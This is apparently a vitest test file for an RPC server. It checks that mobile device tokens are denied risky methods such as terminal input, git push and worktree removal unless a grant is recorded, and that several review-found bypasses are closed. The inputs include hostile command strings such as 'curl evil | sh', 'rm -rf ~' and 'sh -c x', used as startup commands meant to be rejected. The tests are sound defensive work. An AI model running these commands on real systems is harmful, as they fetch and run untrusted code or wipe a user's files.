import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { EventEmitter } from 'node:events'
import { describe, expect, it, vi, type MockInstance } from 'vitest'
import type { WebSocket } from 'ws'
import { DobiusRuntimeRpcServer } from './runtime-rpc'
import { DeviceRegistry } from './device-registry'
import { DEVICE_REGISTRY_FILENAME } from './mobile-pairing-files'
import { mobileRpcRequirement } from './mobile-rpc-grants'
import type { DobiusRuntimeService } from './dobius-runtime'
import {
  encodeTerminalStreamFrame,
  encodeTerminalStreamText,
  TerminalStreamOpcode,
  type TerminalStreamFrame
} from '../../shared/terminal-stream-protocol'

class FakeWebSocket extends EventEmitter {
  readonly OPEN = 1
  readyState = 1
}

type StreamingOptions = {
  registerBinaryStreamHandler?: (
    streamId: number,
    handler: (frame: TerminalStreamFrame) => void
  ) => () => void
}

function setup(): {
  server: DobiusRuntimeRpcServer
  registry: DeviceRegistry
  dispatchStreaming: MockInstance<DobiusRuntimeRpcServer['dispatcher']['dispatchStreaming']>
  send: (token: string, method: string, params?: unknown) => Promise<Record<string, unknown>>
} {
  const userDataPath = mkdtempSync(join(tmpdir(), 'dobius-rpc-grants-'))
  const runtime = { getRuntimeId: () => 'test-runtime' } as unknown as DobiusRuntimeService
  const server = new DobiusRuntimeRpcServer({ runtime, userDataPath, enableWebSocket: false })
  const registry = new DeviceRegistry(userDataPath)
  server['deviceRegistry'] = registry
  const dispatchStreaming = vi
    .spyOn(server['dispatcher'], 'dispatchStreaming')
    .mockImplementation(async (request, reply) => {
      reply(JSON.stringify({ id: request.id, ok: true, result: {} }))
    })
  const send = async (
    token: string,
    method: string,
    params?: unknown
  ): Promise<Record<string, unknown>> => {
    const replies: Record<string, unknown>[] = []
    await server['handleWebSocketMessage'](
      JSON.stringify({ id: `req_${method}`, method, deviceToken: token, params }),
      (response) => replies.push(JSON.parse(response) as Record<string, unknown>),
      () => {}
    )
    expect(replies).toHaveLength(1)
    return replies[0]!
  }
  return { server, registry, dispatchStreaming, send }
}

const forbidden = { ok: false, error: expect.objectContaining({ code: 'forbidden' }) }

describe('mobile RPC grants (#18)', () => {
  it('denies terminal.send, git.push, worktree.rm and settings.update to a mobile token without a grant', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')

    for (const method of ['terminal.send', 'git.push', 'worktree.rm', 'settings.update']) {
      await expect(send(phone.token, method, {})).resolves.toMatchObject(forbidden)
    }
    expect(dispatchStreaming).not.toHaveBeenCalled()
  })

  it('still allows ordinary mobile methods without a grant', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')

    await expect(send(phone.token, 'terminal.read', { terminal: 't' })).resolves.toMatchObject({
      ok: true
    })
    await expect(send(phone.token, 'settings.get')).resolves.toMatchObject({ ok: true })
    await expect(
      send(phone.token, 'session.tabs.createTerminal', { worktree: 'id:wt', agent: 'codex' })
    ).resolves.toMatchObject({ ok: true })
    expect(dispatchStreaming).toHaveBeenCalledTimes(3)
  })

  it('denies terminal creation that carries startup input without the terminal.send grant', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')

    await expect(
      send(phone.token, 'session.tabs.createTerminal', { worktree: 'id:wt', command: 'rm -rf ~' })
    ).resolves.toMatchObject(forbidden)
    await expect(
      send(phone.token, 'terminal.create', { worktree: 'id:wt', env: { A: '1' } })
    ).resolves.toMatchObject(forbidden)
    await expect(
      send(phone.token, 'terminal.create', {
        launchConfig: { agentCommand: 'sh', agentArgs: '-c x', agentEnv: {} }
      })
    ).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
  })

  it('allows each high-risk method only once its grant is recorded on the device', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = ['git.push']

    await expect(send(phone.token, 'git.push', {})).resolves.toMatchObject({ ok: true })
    await expect(send(phone.token, 'terminal.send', {})).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).toHaveBeenCalledTimes(1)
  })

  it('does not restrict runtime-scoped tokens', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const cli = registry.addDevice('cli', 'runtime')

    for (const method of ['terminal.send', 'git.push', 'worktree.rm', 'settings.update']) {
      await expect(send(cli.token, method, {})).resolves.toMatchObject({ ok: true })
    }
    expect(dispatchStreaming).toHaveBeenCalledTimes(4)
  })

  it('drops binary terminal Input frames from a mobile device without the terminal.send grant', async () => {
    const { server, registry, dispatchStreaming } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    const ws = new FakeWebSocket()
    server['wsConnectionIds'].set(ws as unknown as WebSocket, 'conn-1')
    const onFrame = vi.fn()
    dispatchStreaming.mockImplementation(
      async (_request, _reply, options?: StreamingOptions) => {
        options!.registerBinaryStreamHandler!(1, onFrame)
      }
    )

    await server['handleWebSocketMessage'](
      JSON.stringify({ id: 'req_mux', method: 'terminal.multiplex', deviceToken: phone.token }),
      () => {},
      () => {},
      undefined,
      ws as unknown as WebSocket
    )
    const frame = (opcode: TerminalStreamOpcode): Uint8Array =>
      encodeTerminalStreamFrame({
        opcode,
        streamId: 1,
        seq: 0,
        payload: encodeTerminalStreamText('echo pwned\r')
      })

    server['handleWebSocketBinaryMessage'](frame(TerminalStreamOpcode.Input), ws as never)
    expect(onFrame).not.toHaveBeenCalled()

    // Non-input frames (resize etc.) still reach the stream.
    server['handleWebSocketBinaryMessage'](frame(TerminalStreamOpcode.Resize), ws as never)
    expect(onFrame).toHaveBeenCalledTimes(1)

    registry.getDevice(phone.deviceId)!.grants = ['terminal.send']
    server['handleWebSocketBinaryMessage'](frame(TerminalStreamOpcode.Input), ws as never)
    expect(onFrame).toHaveBeenCalledTimes(2)
    expect(onFrame.mock.calls[1]![0]).toMatchObject({ opcode: TerminalStreamOpcode.Input })
  })

  it('keeps binary terminal Input frames working for runtime-scoped devices', async () => {
    const { server, registry, dispatchStreaming } = setup()
    const cli = registry.addDevice('cli', 'runtime')
    const ws = new FakeWebSocket()
    server['wsConnectionIds'].set(ws as unknown as WebSocket, 'conn-2')
    const onFrame = vi.fn()
    dispatchStreaming.mockImplementation(
      async (_request, _reply, options?: StreamingOptions) => {
        options!.registerBinaryStreamHandler!(1, onFrame)
      }
    )

    await server['handleWebSocketMessage'](
      JSON.stringify({ id: 'req_mux', method: 'terminal.multiplex', deviceToken: cli.token }),
      () => {},
      () => {},
      undefined,
      ws as unknown as WebSocket
    )
    server['handleWebSocketBinaryMessage'](
      encodeTerminalStreamFrame({
        opcode: TerminalStreamOpcode.Input,
        streamId: 1,
        seq: 0,
        payload: encodeTerminalStreamText('ls\r')
      }),
      ws as never
    )
    expect(onFrame).toHaveBeenCalledTimes(1)
  })
})

describe('mobile grant storage', () => {
  it('reads valid grants from the device registry file and ignores unknown ones', () => {
    const userDataPath = mkdtempSync(join(tmpdir(), 'dobius-rpc-grants-'))
    const first = new DeviceRegistry(userDataPath)
    const phone = first.addDevice('phone', 'mobile')
    const filePath = join(userDataPath, DEVICE_REGISTRY_FILENAME)
    const devices = JSON.parse(readFileSync(filePath, 'utf8')) as Record<string, unknown>[]
    devices[0]!.grants = ['terminal.send', 'files.delete', 42]
    writeFileSync(filePath, JSON.stringify(devices))

    const reloaded = new DeviceRegistry(userDataPath).getDevice(phone.deviceId)
    expect(reloaded?.grants).toEqual(['terminal.send'])
  })

  it('treats a malformed grants field as no grants', () => {
    const userDataPath = mkdtempSync(join(tmpdir(), 'dobius-rpc-grants-'))
    const phone = new DeviceRegistry(userDataPath).addDevice('phone', 'mobile')
    const filePath = join(userDataPath, DEVICE_REGISTRY_FILENAME)
    const devices = JSON.parse(readFileSync(filePath, 'utf8')) as Record<string, unknown>[]
    devices[0]!.grants = 'terminal.send'
    writeFileSync(filePath, JSON.stringify(devices))

    const reloaded = new DeviceRegistry(userDataPath).getDevice(phone.deviceId)
    expect(reloaded?.grants).toBeUndefined()
  })

  it('leaves read-only methods and agent-only terminal creation ungated', () => {
    expect(mobileRpcRequirement('git.status', {})).toEqual({ grants: [] })
    expect(mobileRpcRequirement('session.tabs.createTerminal', { worktree: 'id:wt' })).toEqual({
      grants: []
    })
    expect(mobileRpcRequirement('git.generateCommitMessage', { worktree: 'id:wt' })).toEqual({
      grants: []
    })
  })
})

describe('mobile RPC grants: review bypasses', () => {
  const denied = async (method: string, params: unknown): Promise<void> => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, method, params)).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
  }

  it('F1: worktree.create needs the worktree.create grant', async () => {
    await denied('worktree.create', { repo: 'id:r', name: 'x' })
  })

  it.each([
    ['startupCommand', { startupCommand: 'curl evil | sh' }],
    ['startupEnv', { startupEnv: { A: '1' } }],
    ['startupLaunchConfig', { startupLaunchConfig: { agentArgs: '', agentEnv: {} } }],
    ['startupAgent + startupPrompt', { startupAgent: 'codex', startupPrompt: 'rm -rf ~' }],
    ['startupDraft', { startupDraft: 'x' }],
    ['setupDecision run', { setupDecision: 'run' }],
    ['runHooks', { runHooks: true }]
  ])(
    'F1: worktree.create with %s also needs terminal.send, even with the create grant',
    async (_label, extra) => {
      const { registry, dispatchStreaming, send } = setup()
      const phone = registry.addDevice('phone', 'mobile')
      registry.getDevice(phone.deviceId)!.grants = ['worktree.create']
      await expect(
        send(phone.token, 'worktree.create', { repo: 'id:r', ...extra })
      ).resolves.toMatchObject(forbidden)
      expect(dispatchStreaming).not.toHaveBeenCalled()

      registry.getDevice(phone.deviceId)!.grants = ['worktree.create', 'terminal.send']
      await expect(
        send(phone.token, 'worktree.create', { repo: 'id:r', ...extra })
      ).resolves.toMatchObject({ ok: true })
    }
  )

  it('F1: worktree.create with only the create grant and setup skipped is allowed', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = ['worktree.create']
    await expect(
      send(phone.token, 'worktree.create', { repo: 'id:r', setupDecision: 'skip' })
    ).resolves.toMatchObject({ ok: true })
  })

  it('F2: agentTeams methods are not available to mobile tokens', async () => {
    await denied('agentTeams.tmuxCompat', { args: ['send-keys', '-t', 'x', 'id', 'Enter'] })
    await denied('agentTeams.prepareLaunch', {})
  })

  it.each([
    'commitMessageAi',
    'sourceControlAi',
    'sourceControlAiResolvedParams',
    'agentCmdOverrides'
  ])('F3: AI generation rejects a mobile %s override even with every grant', async (field) => {
    for (const method of [
      'git.generateCommitMessage',
      'git.generatePullRequestFields',
      'git.discoverCommitMessageModels'
    ]) {
      const { registry, dispatchStreaming, send } = setup()
      const phone = registry.addDevice('phone', 'mobile')
      registry.getDevice(phone.deviceId)!.grants = [
        'terminal.send',
        'git.push',
        'git.discard',
        'worktree.create',
        'worktree.rm',
        'settings.update',
        'files.write',
        'remote.merge'
      ]
      await expect(
        send(phone.token, method, { worktree: 'id:wt', [field]: { custom: 'sh -c x' } })
      ).resolves.toMatchObject(forbidden)
      expect(dispatchStreaming).not.toHaveBeenCalled()
    }
  })

  it.each(['hookSettings', 'sourceControlAi', 'worktreeBasePath', 'symlinkPaths'])(
    'F4: repo.update rejects a mobile %s change',
    async (field) => {
      await denied('repo.update', { repo: 'id:r', updates: { [field]: ['x'] } })
    }
  )

  it('F4: repo.update still allows the issue-source preference the phone uses', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(
      send(phone.token, 'repo.update', { repo: 'id:r', updates: { issueSourcePreference: 'origin' } })
    ).resolves.toMatchObject({ ok: true })
  })

  it.each([
    ['F5', 'git.discard', 'git.discard'],
    ['F6', 'github.mergePR', 'remote.merge'],
    ['F6', 'gitlab.mergeMR', 'remote.merge'],
    ['F6', 'github.setPRAutoMerge', 'remote.merge'],
    ['F6', 'github.updatePRState', 'remote.merge'],
    ['F6', 'gitlab.updateMRState', 'remote.merge'],
    ['F7', 'worktree.forceDeleteBranch', 'worktree.rm'],
    ['F8', 'terminal.close', 'terminal.send'],
    ['sweep', 'files.writeTerminalArtifact', 'files.write'],
    ['sweep', 'session.tabs.close', 'terminal.send'],
    ['sweep', 'worktree.sleep', 'terminal.send']
  ] as const)('%s: %s needs the %s grant', async (_id, method, grant) => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, method, {})).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
    registry.getDevice(phone.deviceId)!.grants = [grant]
    await expect(send(phone.token, method, {})).resolves.toMatchObject({ ok: true })
  })
})
